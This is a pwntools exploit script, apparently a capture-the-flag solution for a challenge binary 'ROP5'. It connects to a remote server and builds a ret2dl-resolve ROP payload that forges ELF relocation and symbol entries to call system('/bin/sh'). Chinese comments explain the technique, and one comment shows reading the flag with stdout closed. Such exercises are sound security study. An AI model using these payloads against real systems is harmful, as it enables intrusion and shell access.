# -*- coding: utf-8 -*-
from pwn import *

elf=ELF("./ROP5")
offset = 0x48
read_plt = elf.plt["read"]  # read@plt
ppp_ret = 0x080485D9  # ROPgadget --binary bof --only "pop|ret" "pop esi; pop edi; pop ebp; ret;"
plt0_addr = 0x08048380  # plt[0]
bss_addr = 0x0804a140  # readelf -S bof | grep ".bss"


#r = process('./ROP5')
r= remote("47.103.214.163","20700")
r.recvuntil('LEVEL5?')

payload = 'A' * offset
payload += p32(read_plt)  # 覆盖返还地址 为read
payload += p32(ppp_ret)
payload += p32(0)
payload += p32(bss_addr)
payload += p32(100)
payload += p32(plt0_addr) #  直接在原来栈上伪造
payload += p32(0x1e28)    #  通过改变这个偏移指向伪造的 ELF JMPREL Relocation Table  ， bss + 0x18 - ELF JMPREL Relocation Table
payload += 'A' * 0x4
payload += p32(bss_addr) +"\n"  # 指向字符串/bin/sh
r.send(payload)
sleep(0.1)

payload2 = "/bin/sh\x00"
payload2 += 'A' * 0x10
payload2 += p32(0x804a018) # 指向got.plt的一个地址
payload2 += p32(0x1f907)  # 0x0804a040+0x28-0x080481d8 (symblos table) = 0x1e90  r_info=(((0x1f90)/0x10)<<8)|7=0x1f907 用于查找函数的符号、
payload2 += 'A' * 0x8
payload2 += p32(0x1f00) + p32(0) + p32(0) + p32(0x12)   #st_name=0x0804a040+0x38-0x08048278(string table)=0x1e00
payload2 += "system\x00" +"\n" #
#gdb.attach(r,"b *0x08048380")
r.send(payload2)
r.interactive()

# 总结 ：伪造一个偏移去指向伪造的 ELF JMPREL Relocation Table  elf.rel + esp (esp就是偏移)
# 伪造的数据包括两项
'''
typedef struct {
    Elf32_Addr r_offset;    // 对于可执行文件，此值为虚拟地址
    Elf32_Word r_info;      // 符号表索引
} Elf32_Rel;
'''
# 上面结构体第一个指向got.plt中的一个即可，第二个r_info  满足(r_info>>8)+symbol table 去查找符号信息
# 根据找到的符号信息 第一个4字节 + string table 去找到相应的函数名字符串
# r_info的算法r_info=(((length)/0x10)<<8)|7=0x1f907，length = 伪造的符号表信息所在位置-原来符号表的位置
# 每一条符号信息长度0x10
# 注意，尽量别往bss刚刚开始的地方分配伪造数据，防止esp访问到不可写的段
# cat flag >&0 关闭了标准输出的情况打印flag
